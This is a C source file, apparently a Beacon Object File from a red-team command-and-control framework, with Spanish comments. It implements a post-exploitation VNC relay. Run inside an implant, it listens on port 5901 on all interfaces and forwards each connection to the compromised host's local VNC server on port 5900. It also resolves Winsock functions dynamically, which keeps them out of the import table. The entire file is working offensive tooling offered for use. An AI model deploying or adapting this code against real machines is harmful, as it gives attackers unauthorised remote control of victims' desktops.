/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#include <winsock2.h>
#include <windows.h>
#include "beacon.h"

// ================================
// IMPORTS DIRECTOS
// ================================
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_VirtualAlloc;
extern PVOID __imp_VirtualFree;
extern PVOID __imp_CloseHandle;

// ================================
// TIPOS
// ================================
typedef HMODULE (WINAPI *LOADLIBRARYA)(LPCSTR);
typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *VIRTUALFREE)(LPVOID, SIZE_T, DWORD);

// ================================
// FUNCIONES DE RED
// ================================
typedef int (WINAPI *WSASTARTUP)(WORD, LPWSADATA);
typedef SOCKET (WINAPI *SOCKETFN)(int, int, int);
typedef int (WINAPI *BIND)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *LISTEN)(SOCKET, int);
typedef SOCKET (WINAPI *ACCEPT)(SOCKET, struct sockaddr*, int*);
typedef int (WINAPI *CONNECT)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *SEND)(SOCKET, const char*, int, int);
typedef int (WINAPI *RECV)(SOCKET, char*, int, int);
typedef int (WINAPI *SELECT)(int, fd_set*, fd_set*, fd_set*, const struct timeval*);
typedef int (WINAPI *CLOSESOCKET)(SOCKET);
typedef int (WINAPI *WSACLEANUP)(void);
typedef int (WINAPI *WSAGETLASTERROR)(void);
typedef ULONG (WINAPI *HTONL)(ULONG);
typedef USHORT (WINAPI *HTONS)(USHORT); // ✅ ¡Nuevo! htons para puertos

// ================================
// FD_ISSET MANUAL
// ================================
int my_FD_ISSET(SOCKET sock, fd_set *set) {
    if (!set) return 0;
    for (u_int i = 0; i < set->fd_count; i++) {
        if (set->fd_array[i] == sock) {
            return 1;
        }
    }
    return 0;
}

// ================================
// RELAY TRAFFIC
// ================================
void relay_traffic(SOCKET client_sock, SOCKET vnc_sock) {
    LPVOID pMem = ((LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))__imp_VirtualAlloc)(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMem) return;

    char* buffer = (char*)pMem;
    fd_set read_fds;
    int result;

    HMODULE hWs2_32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("ws2_32.dll");
    if (!hWs2_32) {
        ((BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD))__imp_VirtualFree)(pMem, 0, MEM_RELEASE);
        return;
    }

    SELECT pSelect = (SELECT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "select");
    if (!pSelect) {
        ((BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD))__imp_VirtualFree)(pMem, 0, MEM_RELEASE);
        return;
    }

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(client_sock, &read_fds);
        FD_SET(vnc_sock, &read_fds);

        result = pSelect(0, &read_fds, NULL, NULL, NULL);
        if (result <= 0) break;

        if (my_FD_ISSET(client_sock, &read_fds)) {
            RECV pRecv = (RECV)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "recv");
            if (!pRecv) break;

            int bytes = pRecv(client_sock, buffer, 4096, 0);
            if (bytes <= 0) break;

            SEND pSend = (SEND)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "send");
            if (pSend) pSend(vnc_sock, buffer, bytes, 0);
        }

        if (my_FD_ISSET(vnc_sock, &read_fds)) {
            RECV pRecv = (RECV)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "recv");
            if (!pRecv) break;

            int bytes = pRecv(vnc_sock, buffer, 4096, 0);
            if (bytes <= 0) break;

            SEND pSend = (SEND)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "send");
            if (pSend) pSend(client_sock, buffer, bytes, 0);
        }
    }

    ((BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD))__imp_VirtualFree)(pMem, 0, MEM_RELEASE);
}

// ================================
// FUNCIÓN PRINCIPAL — ¡CORREGIDO!
// ================================
void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[VNC RELAY] Iniciando relay en 0.0.0.0:5901 → 127.0.0.1:5900\n");

    HMODULE hWs2_32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("ws2_32.dll");
    if (!hWs2_32) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo cargar ws2_32.dll\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ws2_32.dll cargada\n");

    WSASTARTUP pWSAStartup = (WSASTARTUP)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "WSAStartup");
    if (!pWSAStartup) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo resolver WSAStartup\n");
        return;
    }

    WSADATA wsaData;
    if (pWSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WSAStartup falló\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] WSAStartup exitoso\n");

    SOCKETFN pSocket = (SOCKETFN)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "socket");
    BIND pBind = (BIND)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "bind");
    LISTEN pListen = (LISTEN)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "listen");
    ACCEPT pAccept = (ACCEPT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "accept");
    CONNECT pConnect = (CONNECT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "connect");
    CLOSESOCKET pCloseSocket = (CLOSESOCKET)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "closesocket");
    WSAGETLASTERROR pWSAGetLastError = (WSAGETLASTERROR)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "WSAGetLastError");
    HTONS phtons = (HTONS)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "htons"); // ✅ ¡htons para puertos!

    if (!pSocket || !pBind || !pListen || !pAccept || !pConnect || !pCloseSocket || !pWSAGetLastError || !phtons) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudieron resolver funciones de socket\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Funciones de socket resueltas\n");

    SOCKET listen_sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_sock == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "[-] socket() falló\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Socket de escucha creado\n");

    struct sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = phtons(5901); // ✅ ¡CORREGIDO! htons, no htonl

    if (pBind(listen_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        int error = pWSAGetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[-] bind() falló con error: %d\n", error);
        pCloseSocket(listen_sock);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] bind() exitoso\n");

    if (pListen(listen_sock, SOMAXCONN) == SOCKET_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[-] listen() falló\n");
        pCloseSocket(listen_sock);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] listen() exitoso\n");

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ✅ Escuchando en 0.0.0.0:5901 — ¡Listo para conexiones VNC!\n");

    while (1) {
        SOCKET client_sock = pAccept(listen_sock, NULL, NULL);
        if (client_sock == INVALID_SOCKET) {
            int error = pWSAGetLastError();
            BeaconPrintf(CALLBACK_ERROR, "[-] accept() falló con error: %d\n", error);
            continue;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ¡Nueva conexión aceptada!\n");

        SOCKET vnc_sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (vnc_sock == INVALID_SOCKET) {
            pCloseSocket(client_sock);
            continue;
        }

        struct sockaddr_in vnc_addr = {0};
        vnc_addr.sin_family = AF_INET;
        vnc_addr.sin_addr.s_addr = htonl(0x7F000001); 
        vnc_addr.sin_port = phtons(5900);          // ✅ ¡htons, no htonl!

        if (pConnect(vnc_sock, (struct sockaddr*)&vnc_addr, sizeof(vnc_addr)) == SOCKET_ERROR) {
            int error = pWSAGetLastError();
            BeaconPrintf(CALLBACK_ERROR, "[-] connect() al VNC local falló con error: %d\n", error);
            pCloseSocket(vnc_sock);
            pCloseSocket(client_sock);
            continue;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ¡Conectado al VNC local!\n");

        BeaconPrintf(CALLBACK_OUTPUT, "[+] ¡Iniciando relay de tráfico VNC!\n");
        relay_traffic(client_sock, vnc_sock);

        pCloseSocket(vnc_sock);
        pCloseSocket(client_sock);
    }

    pCloseSocket(listen_sock);
    WSACLEANUP pWSACleanup = (WSACLEANUP)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "WSACleanup");
    if (pWSACleanup) pWSACleanup();
}
